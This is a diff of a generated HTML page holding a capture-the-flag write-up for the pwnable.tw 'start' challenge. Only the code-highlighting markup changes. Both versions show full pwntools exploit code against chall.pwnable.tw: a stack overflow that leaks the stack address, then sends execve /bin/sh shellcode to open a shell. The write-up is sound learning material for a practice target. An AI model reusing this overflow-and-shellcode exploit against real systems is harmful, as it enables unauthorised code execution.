@@ -1,4 +1,4 @@
-I"Á<p><img src="/assets/images/pwnabletw1/pwnable1.png" alt="" /></p>
+I"Ã<p><img src="/assets/images/pwnabletw1/pwnable1.png" alt="" /></p>
 
 <h4 id="aim">AIM:</h4>
 <p>Hey guys, Here our main objective is to get a shell and then to get the flag !!
@@ -56,15 +56,15 @@ Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equiv
   <li>We donâ€™t have to worry about the shift of the stack because there is no PIE</li>
 </ul>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="k">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -79,20 +79,20 @@ Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equiv
 </ul>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">'</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="sh">'</span>
 <span class="c1">#new exploit
-</span><span class="n">buf</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
+</span><span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
